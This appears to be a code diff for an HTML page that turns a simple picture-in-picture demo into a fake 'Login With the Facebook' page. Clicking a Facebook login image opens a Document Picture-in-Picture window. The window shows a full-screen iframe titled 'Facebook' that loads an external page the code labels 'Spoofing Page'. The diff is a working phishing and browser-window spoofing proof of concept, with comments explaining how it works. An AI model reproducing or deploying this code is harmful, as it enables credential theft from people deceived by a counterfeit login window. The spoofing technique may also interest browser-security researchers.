@@ -1,16 +1,28 @@
-<title>App</title>
-<style>#content{display:none;}</style>
+<title>Awesome App</title>
+<style>#content { display: none; }</style>
 
-<button onclick="pip()">Open</button>
+<center>
+<br><br><br><h2>Login With the <b>Facebook</b>: <br><br><br><br>
+<img style="cursor: pointer;" src=https://scandiweb.com/blog/wp-content/uploads/2021/02/facebook-login-button-png-11.png id="button">
 
 <div id="content">
-<iframe id=frm style="display:none;width:100%;height:100%;" src=https://sauceialist.github.io/dia/test3.html></iframe>
+<title>Facebook</title>
+<iframe id=frm style="position: fixed;display:none;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 999999;height: 100%;" src=https://sauceialist.github.io/dia/test3.html>Spoofing Page</iframe>
 </div>
 
-<script>
-async function pip() {
-    w = await documentPictureInPicture.requestWindow();
-    w.document.body.append(content);
-    w.frm.style.display='block';
-}
+<script> 
+    var pipOpen = async () => {
+        pipWindow = await documentPictureInPicture.requestWindow({
+            width: 600,
+            height: 700
+        });
+
+        // KEY DIFFERENCE: Append content DAN access elements melalui pipWindow
+        pipWindow.document.body.append(content); 
+        
+        // Ini bekerja karena 'content' adalah DOM element yang di-append
+        // dan 'frm' menjadi available dalam pipWindow context
+        pipWindow.frm.style.display='block';
+    };
+    button.onclick = pipOpen;
 </script>
